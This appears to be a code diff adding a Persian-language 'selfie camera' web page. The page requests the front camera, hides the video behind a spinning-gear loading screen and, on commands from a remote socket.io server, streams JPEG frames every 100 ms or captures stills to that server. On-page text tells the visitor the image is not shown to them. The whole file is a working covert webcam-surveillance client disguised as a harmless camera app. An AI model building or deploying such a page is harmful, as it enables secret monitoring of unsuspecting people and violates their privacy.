@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📱 دوربین سلفی</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: Tahoma;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loading-screen {
+            max-width: 300px;
+        }
+        
+        .spinner {
+            width: 100px;
+            height: 100px;
+            border: 10px solid #333;
+            border-top: 10px solid #4CAF50;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 30px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status {
+            font-size: 20px;
+            margin: 20px 0;
+            color: #4CAF50;
+            direction: rtl;
+        }
+        
+        .error {
+            color: #ff4444;
+        }
+        
+        .connection-info {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 30px;
+            font-size: 14px;
+        }
+        
+        #videoElement {
+            display: none;
+        }
+        
+        .gear {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: rotate 3s linear infinite;
+        }
+        
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen" id="loadingScreen">
+        <div class="gear">⚙️</div>
+        <h2>سیستم دوربین سلفی</h2>
+        <div class="status" id="status">⏳ در حال راه‌اندازی...</div>
+        
+        <div class="connection-info">
+            <div>📡 در انتظار اتصال به سرور</div>
+            <div>📍 این صفحه فقط چرخ‌دنده را نشان می‌دهد</div>
+            <div>👁️ تصویر برای شما نمایش داده نمی‌شود</div>
+        </div>
+    </div>
+    
+    <video id="videoElement" autoplay playsinline></video>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // عناصر صفحه
+        const statusDiv = document.getElementById('status');
+        const videoElement = document.getElementById('videoElement');
+        
+        // متغیرها
+        let mediaStream = null;
+        let canvas = null;
+        let ctx = null;
+        let isStreaming = false;
+        let streamInterval = null;
+        
+        // اتصال به سرور
+        const socket = io();
+        socket.emit('identify', 'client');
+        
+        // وضعیت اتصال
+        socket.on('connect', () => {
+            statusDiv.textContent = '✅ به سرور متصل شد';
+            statusDiv.style.color = '#4CAF50';
+            setTimeout(initCamera, 1000);
+        });
+        
+        socket.on('disconnect', () => {
+            statusDiv.textContent = '❌ قطع ارتباط با سرور';
+            statusDiv.style.color = '#ff4444';
+            stopStreaming();
+        });
+        
+        // دریافت دستور از سرور
+        socket.on('command', (command) => {
+            console.log('دستور دریافت شد:', command);
+            
+            switch(command.action) {
+                case 'start-stream':
+                    startStreaming();
+                    statusDiv.textContent = '▶️ در حال ارسال تصویر...';
+                    break;
+                    
+                case 'stop-stream':
+                    stopStreaming();
+                    statusDiv.textContent = '⏸️ ارسال متوقف شد';
+                    break;
+                    
+                case 'capture-image':
+                    captureImage();
+                    statusDiv.textContent = '📸 تصویر ثبت شد!';
+                    setTimeout(() => {
+                        if (isStreaming) {
+                            statusDiv.textContent = '▶️ در حال ارسال تصویر...';
+                        }
+                    }, 2000);
+                    break;
+            }
+        });
+        
+        // راه‌اندازی دوربین
+        async function initCamera() {
+            try {
+                statusDiv.textContent = '📷 درخواست دسترسی به دوربین...';
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user', // دوربین سلفی
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false // فقط تصویر
+                });
+                
+                videoElement.srcObject = mediaStream;
+                
+                // ایجاد کانوس مخفی
+                canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                ctx = canvas.getContext('2d');
+                
+                statusDiv.textContent = '✅ دوربین آماده است';
+                statusDiv.style.color = '#4CAF50';
+                
+            } catch (error) {
+                statusDiv.innerHTML = '❌ خطا در دسترسی به دوربین<br><small>' + error.message + '</small>';
+                statusDiv.style.color = '#ff4444';
+            }
+        }
+        
+        // شروع ارسال تصویر
+        function startStreaming() {
+            if (!mediaStream || isStreaming) return;
+            
+            isStreaming = true;
+            
+            streamInterval = setInterval(() => {
+                if (videoElement.videoWidth > 0) {
+                    // رسم تصویر روی کانوس
+                    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    
+                    // تبدیل به عکس با کیفیت متوسط
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    // ارسال به سرور
+                    socket.emit('stream', {
+                        image: imageData,
+                        timestamp: Date.now()
+                    });
+                }
+            }, 100); // هر 100 میلی‌ثانیه
+        }
+        
+        // توقف ارسال
+        function stopStreaming() {
+            isStreaming = false;
+            if (streamInterval) {
+                clearInterval(streamInterval);
+                streamInterval = null;
+            }
+        }
+        
+        // ثبت تصویر
+        function captureImage() {
+            if (!mediaStream) return;
+            
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+            
+            socket.emit('captured-image', {
+                image: imageData
+            });
+        }
+        
+        // تمیزکاری
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
